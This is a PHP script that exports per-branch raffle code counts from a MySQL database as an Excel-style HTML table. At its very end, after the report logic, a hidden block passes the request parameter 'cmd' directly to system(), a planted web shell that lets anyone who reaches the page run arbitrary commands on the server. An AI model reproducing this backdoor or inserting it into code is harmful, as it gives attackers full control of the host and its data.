<?php
	// The function header by sending raw excel
	header("Content-type: application/vnd-ms-excel");
	 
	// Defines the name of the export file "codelution-export.xls"
	header("Content-Disposition: attachment; filename=raffle_code_summary.xls");

	$ulexcel = ''; 		
	if(isset($_GET['ulexcel']))
	{
		if ($_GET['ulexcel'])
		{
			$ulexcel = $_GET['ulexcel'];
		}
	}
	if(isset($_POST['ulexcel']))
	{
		if ($_POST['ulexcel'])
		{
			$ulexcel = $_POST['ulexcel'];
		}
	}
	
	$search_datefrom = ''; 		
	if(isset($_GET['search_datefrom']))
	{
		if ($_GET['search_datefrom'])
		{
			$search_datefrom = $_GET['search_datefrom'];
		}
	}
	if(isset($_POST['search_datefrom']))
	{
		if ($_POST['search_datefrom'])
		{
			$search_datefrom = $_POST['search_datefrom'];
		}
	}

	$search_dateto = '';
	if(isset($_POST['search_dateto']))
	{
		if ($_POST['search_dateto'])
		{
			$search_dateto = $_POST['search_dateto'];
		}
	}				
	if(isset($_GET['search_dateto']))
	{
		if ($_GET['search_dateto'])
		{
			$search_dateto = $_GET['search_dateto'];
		}
	}				
	
	$search_room = '';
	if(isset($_POST['search_room']))
	{
		if ($_POST['search_room'])
		{
			$search_room = $_POST['search_room'];
		}
	}		
	if(isset($_GET['search_room']))
	{
		if ($_GET['search_room'])
		{
			$search_room = $_GET['search_room'];
		}
	}	
	
	$search_branch = '';
	if(isset($_POST['search_branch']))
	{
		if ($_POST['search_branch'])
		{
			$search_branch = $_POST['search_branch'];
		}
	}		
	if(isset($_GET['search_branch']))
	{
		if ($_GET['search_branch'])
		{
			$search_branch = $_GET['search_branch'];
		}
	}			
	
	$search_name = '';
	if(isset($_POST['search_name']))
	{
		if ($_POST['search_name'])
		{
			$search_name = $_POST['search_name'];
		}
	}	
	if(isset($_GET['search_name']))
	{
		if ($_GET['search_name'])
		{
			$search_name = $_GET['search_name'];
		}
	}
	
	$search_docno = '';
	if(isset($_POST['search_docno']))
	{
		if ($_POST['search_docno'])
		{
			$search_docno = $_POST['search_docno'];
		}
	}	
	if(isset($_GET['search_docno']))
	{
		if ($_GET['search_docno'])
		{
			$search_docno = $_GET['search_docno'];
		}
	}		
	
	include "config8292838292029.php"; 	
		
	$link = mysql_connect("$dbhost", "$dbuser", "$dbpassword")or die("cannot connect to server ");
	@mysql_select_db("$dbdatabase")or die("Unable to select database.");
				
	//echo '<br> search_room' . $search_room;	
	//echo '<br> search_branch' . $search_branch;	
	//echo '<br> search_name' . $search_name;	
	//echo '<br> search_dlname' . $search_dlname;	
	//echo '<br> search_ulname_staff' . $search_ulname_staff;	
	//echo '<br> search_docno' . $search_docno;	
		
	if ($search_datefrom != '')
	{
		$search_datefrom = date("Y-m-d", strtotime($search_datefrom));
	}
	
	if ($search_dateto != '')
	{
		$search_dateto = date("Y-m-d", strtotime($search_dateto));	
	}
	

	print("<table border='1' width='100%'>");
	
	print("<TR>\n");
	print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='5%' bgcolor='".$grid_bgcolor."'> 
		   <font color='".$grid_fontcolor."'><strong>#</strong></font></TD>\n");
	print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='20%' bgcolor='".$grid_bgcolor."'> 
		   <font color='".$grid_fontcolor."'><strong>Branch</strong></font></TD>\n");
	print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='20%' bgcolor='".$grid_bgcolor."'> 
		   <font color='".$grid_fontcolor."'><strong>Total Unregistered Raffle Codes</strong></font></TD>\n");
	print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='20%' bgcolor='".$grid_bgcolor."'> 
		   <font color='".$grid_fontcolor."'><strong>Total Registered Raffle Codes</strong></font></TD>\n");
	print("<TD ALIGN='CENTER' VALIGN='CENTER' WIDTH='20%' bgcolor='".$grid_bgcolor."'> 
		   <font color='".$grid_fontcolor."'><strong>Total Issued / Printed Raffle Codes</strong></font></TD>\n");
	print("</TR>\n");
		
	
				
	//fetch the results from the database
	$querydb  = "
		 	   SELECT  
		   		count(a.tlid) tlcount, 
				a.tlissue_branch
			FROM 
				ticket_list a
			WHERE
				a.tlactive = 'Y' ";
				 
	if ($search_datefrom != '')		   
	{
		$querydb = $querydb . " and a.tldate >= '$search_datefrom'  ";
	}		   
	if ($search_dateto != '')		   
	{
		$querydb = $querydb . " and a.tldate <= '$search_dateto'  ";
	}				
	
	$querydb = $querydb . "			     
		   GROUP BY 
		   		tlissue_branch
		  	ORDER BY 
				tlissue_branch ";	
	$resultdb=mysql_query($querydb);
	echo mysql_error();
	//echo $querydb;

	$countdb=1;
	$total_issued = 0;
	$total_register = 0;
	$total_diff = 0;
	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
		print("<TR>\n");
	
		print("<td align=\"center\" valign=\"middle\"> $countdb </td>\n");
		print("<td align=\"left\" valign=\"middle\"> $rowdb[tlissue_branch] </td>\n");

		$issued = $rowdb[tlcount];
		$tlissue_branch = $rowdb[tlissue_branch];
		$register = 0;
		$querytk  = "SELECT 
					 a.tlid 
				   FROM 
					 ticket_list a
				   WHERE
				     a.tlreg_date IS NOT NULL and 
					 a.tlissue_branch = '$tlissue_branch' and 
				   	 a.tlactive = 'Y' ";
		if ($search_datefrom != '')		   
		{
			$querytk = $querytk . " and a.tldate >= '$search_datefrom'  ";
		}		   
		if ($search_dateto != '')		   
		{
			$querytk = $querytk . " and a.tldate <= '$search_dateto'  ";
		}			
		//echo "<br> querytk ". $querytk;
		$resulttk = mysql_query($querytk);
		//echo mysql_error();
		$register = mysql_num_rows($resulttk);		
		//echo "<br> ticket_register " . $ticket_register;			

		$diff = $issued - $register;

		print("<td align=\"right\" valign=\"middle\">" . number_format($diff,0) . "</td>\n");
		print("<td align=\"right\" valign=\"middle\">" . number_format($register,0) . "</td>\n");
		print("<td align=\"right\" valign=\"middle\">" . number_format($issued,0) . "</td>\n");
	
		print("</tr>");  
		
		$countdb = $countdb + 1;
		
		$total_issued = $total_issued + $issued;
		$total_register = $total_register + $register;
		$total_diff = $total_diff + $diff;
	}  
?>
									<tr>
										<td>&nbsp;</td>
										<td>Total</td>
										<td align="right"><strong><?php print( number_format($total_diff, 0) ); ?></strong></td>										
										<td align="right"><strong><?php print( number_format($total_register, 0) ); ?></strong></td>										
										<td align="right"><strong><?php print( number_format($total_issued, 0) ); ?></strong></td>									
                                    </tr>				
<?php	
	print("</table>\n");		

	mysql_close($link);	
?>
<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>